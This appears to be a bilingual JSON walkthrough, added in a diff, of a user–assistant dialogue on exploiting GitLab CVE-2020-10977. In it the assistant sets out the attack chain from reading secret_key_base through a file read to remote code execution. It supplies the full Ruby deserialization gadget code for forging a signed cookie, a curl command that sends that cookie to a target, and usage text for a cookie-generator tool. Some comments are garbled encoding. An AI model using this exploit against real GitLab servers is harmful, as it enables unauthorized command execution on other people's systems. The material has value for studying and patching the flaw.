@@ -1,0 +1,249 @@
+{
+    "_source_md":  "Gitlab/2022-05-05-GitLab-CVE-2020-10977-RCE.md",
+    "version":  "gitlab-cve-2020-10977-rce",
+    "title":  {
+                  "zh":  "GitLab CVE-2020-10977 任意文件读取导致的远程代码执行",
+                  "en":  "GitLab CVE-2020-10977 RCE via Arbitrary File Read"
+              },
+    "description":  {
+                        "zh":  "通过 CVE-2020-10977 读取 secret_key_base 后，利用反序列化漏洞伪造 Cookie 实现 RCE",
+                        "en":  "Exploit CVE-2020-10977 to read secret_key_base, then use deserialization vulnerability to forge Cookie for RCE"
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析 GitLab CVE-2020-10977 如何导致 RCE",
+                                      "en":  "Analyze how GitLab CVE-2020-10977 leads to RCE"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户询问文件读取漏洞如何升级为 RCE",
+                                         "en":  "User asks how file read vulnerability escalates to RCE"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ cat /opt/gitlab/embedded/service/gitlab-rails/VERSION",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ docker run -it gitlab/gitlab-ee:{version.label} bash",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "on:\n  push:\n    branches:\n      - main\n      - \u0027releases/**\u0027",
+                                             "language":  "yml"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ee/packages/scientific/7/gitlab-ee-12.8.7-ee.0.el7.x86_64.rpm/download.rpm",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "yum -y install ./gitlab......12_8.7.rpm",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "touch /opt/gitlab/embedded/etc/90-omnibus-gitlab-kernel.sem.conf\ntouch /opt/gitlab/embedded/etc/90-omnibus-gitlab-kernel.shmall.conf\ntouch /opt/gitlab/embedded/etc/90-omnibus-gitlab-net.core.somaxconn.conf",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "docker pull gitlab/gitlab-ee:12.8.1-ee.0",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ /opt/gitlab/embedded/bin/runsvdir-start \u0026\n$ gitlab-ctl reconfigure\n$ vi /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml\n# 鏇挎崲secret_key_base涓烘湇鍔?鍙楀绔殑secret_key_base\n$ gitlab-rails console",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "request = ActionDispatch::Request.new(Rails.application.env_config)",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "request.env[\"action_dispatch.cookies_serializer\"] = :marshal",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "cookies = request.cookie_jar",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "erb = ERB.new(\"\u003c%= `echo from CVE-2020-10977 \u003e /tmp/flags` %\u003e\")",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new)",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "cookies.signed[:cookie] = depr",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "puts cookies[:cookie]",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ curl -k -vvv \u0027https://git-lab-domain.com/users/sign_in\u0027 -b \"experimentation_subject_id={cookies[:cookie]}\"",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "    C(ollection) O(f) V(erified) V(ulnerabilities) : cookie_generater.sh in\n    https://github.com/Bin4xin/bigger-than-bigger\n    Author: bin4xin\n    Bash scripts to generate cookies out of [gitlab-rails console].\n    (RCE due to CVE-2020-10977 \u003clocal file read\u003e) visit https://hackerone.com/reports/827052\n     _     _                             _    _                      _     _\n    | |__ (_) __ _  __ _  ___  _ _  ___ | |_ | |_   __ _  _ _   ___ | |__ (_) __ _  __ _  ___  _ _\n    | \u0027_ \\| |/ _\\ |/ _\\ |/ -_)| \u0027_||___||  _|| \u0027 \\ / _| || \u0027 \\ |___|| \u0027_ \\| |/ _\\ |/ _\\ |/ -_)| \u0027_|\n    |_.__/|_|\\__, |\\__, |\\___||_|        \\__||_||_|\\__,_||_||_|     |_.__/|_|\\__, |\\__, |\\___||_|\n             |___/ |___/                                                     |___/ |___/\n\n    USAGE: bash cookie_generater.sh command [$command] [$url]\n    SUCH AS: bash cookie_generater.sh [cmd|--cmd|-c] \"touch /tmp/success\" 8.8.8.8\n    [help|--help|-h]: \t \t print help message. 鎵撳嵃甯姪淇℃伅\n    [cmd|--cmd|-c]: \t \t generate cookies mode. 鐢熸垚COOKIE\n    [$command]: \t \t command you want to execute. 瑕佹墽琛岀殑鍛戒护\n    [$url]: \t \t gitlab vuln url (unnecessary). gitlab鍦板潃锛岄潪蹇呰",
+                                             "language":  "console"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "# /opt/gitlab/embedded/service/gitlab-rails/config/initializers/cookies_serializer.rb\n# Be sure to restart your server when you modify this file.\n\nRails.application.config.action_dispatch.use_cookies_with_metadata = false\nRails.application.config.action_dispatch.cookies_serializer = :hybrid",
+                                             "language":  "ruby"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "CVE-2020-10977 本身是文件读取漏洞，但可以通过读取敏感文件进一步实现 RCE。影响版本为 GitLab CE/EE \u003e=8.5 且 \u003c 12.9。攻击链为：1) 利用文件读取漏洞获取 /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml 中的 secret_key_base；2) 使用该密钥生成恶意的序列化 Cookie；3) 发送恶意 Cookie 触发反序列化执行命令。",
+                                      "en":  "CVE-2020-10977 itself is a file read vulnerability, but can escalate to RCE by reading sensitive files. Affected versions are GitLab CE/EE \u003e=8.5 and \u003c 12.9. Attack chain: 1) Use file read vulnerability to get secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml; 2) Use the key to generate malicious serialized Cookie; 3) Send malicious Cookie to trigger deserialization command execution."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手解释从文件读到 RCE 的攻击链",
+                                         "en":  "Assistant explains attack chain from file read to RCE"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "如何生成恶意的 Cookie？",
+                                      "en":  "How to generate malicious Cookie?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户询问利用工具的使用",
+                                         "en":  "User asks about exploit tool usage"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "需要先搭建与目标相同版本的 GitLab 环境。步骤：1) 拉取相同版本镜像：docker pull gitlab/gitlab-ee:12.8.1-ee.0；2) 启动容器并进入 console；3) 修改 secrets.yml 文件，将 secret_key_base 替换为目标服务器的值；4) 使用 gitlab-rails console 执行 Ruby 代码生成 ERB 模板对象，包装成 ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy 对象；5) 将该对象序列化为 Cookie 值；6) 使用 curl 发送 Cookie 到目标服务器触发命令执行。",
+                                      "en":  "Need to set up same version GitLab environment. Steps: 1) Pull same version image: docker pull gitlab/gitlab-ee:12.8.1-ee.0; 2) Start container and enter console; 3) Modify secrets.yml file, replace secret_key_base with target server\u0027s value; 4) Use gitlab-rails console to execute Ruby code generating ERB template object, wrapped as ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy object; 5) Serialize the object as Cookie value; 6) Use curl to send Cookie to target server to trigger command execution."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手详细说明 Cookie 生成步骤",
+                                         "en":  "Assistant details Cookie generation steps"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "gitlab-rails console",
+                      "content":  {
+                                      "zh":  "Ruby 代码示例：\nrequest = ActionDispatch::Request.new(Rails.application.env_config)\nrequest.env[\"action_dispatch.cookies_serializer\"] = :marshal\ncookies = request.cookie_jar\nerb = ERB.new(\"\u003c%= `echo from CVE-2020-10977 \u003e /tmp/flags` %\u003e\")\ndepr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new)\ncookies.signed[:cookie] = depr\nputs cookies[:cookie]",
+                                      "en":  "Ruby code example:\nrequest = ActionDispatch::Request.new(Rails.application.env_config)\nrequest.env[\"action_dispatch.cookies_serializer\"] = :marshal\ncookies = request.cookie_jar\nerb = ERB.new(\"\u003c%= `echo from CVE-2020-10977 \u003e /tmp/flags` %\u003e\")\ndepr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new)\ncookies.signed[:cookie] = depr\nputs cookies[:cookie]"
+                                  },
+                      "annotation":  {
+                                         "zh":  "展示生成恶意 Cookie 的 Ruby 代码",
+                                         "en":  "Show Ruby code for generating malicious Cookie"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "这个漏洞的原理是什么？",
+                                      "en":  "What is the principle behind this vulnerability?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户询问代码层面的漏洞原理",
+                                         "en":  "User asks about code-level vulnerability principle"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "关键在于 config/initializers/cookies_serializer.rb 文件中配置的 cookies_serializer = :hybrid。这个配置允许反序列化 marshal 格式的 Cookie。当攻击者获得了 secret_key_base 后，可以签名任意的序列化对象。通过构造 ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy 对象包装 ERB 模板，当 GitLab 反序列化这个 Cookie 时，会触发 ERB 模板的 result 方法执行任意命令。这与 Shiro 反序列化漏洞的利用方式类似。",
+                                      "en":  "The key is cookies_serializer = :hybrid configured in config/initializers/cookies_serializer.rb file. This configuration allows deserialization of marshal format Cookies. When attacker obtains secret_key_base, they can sign arbitrary serialized objects. By constructing ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy object wrapping ERB template, when GitLab deserializes this Cookie, it triggers ERB template\u0027s result method to execute arbitrary commands. This is similar to Shiro deserialization vulnerability exploitation."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手深入分析反序列化漏洞原理",
+                                         "en":  "Assistant analyzes deserialization vulnerability principle in depth"
+                                     }
+                  },
+                  {
+                      "type":  "system_event",
+                      "content":  {
+                                      "zh":  "参考链接：HackerOne 报告 (https://hackerone.com/reports/827052)、Cookie 生成脚本 (https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Gitlab/CVE-2020-10977)",
+                                      "en":  "References: HackerOne report (https://hackerone.com/reports/827052), Cookie generation script (https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Gitlab/CVE-2020-10977)"
+                                  },
+                      "annotation":  {
+                                         "zh":  "系统提供参考资料",
+                                         "en":  "System provides reference materials"
+                                     }
+                  }
+              ]
+}
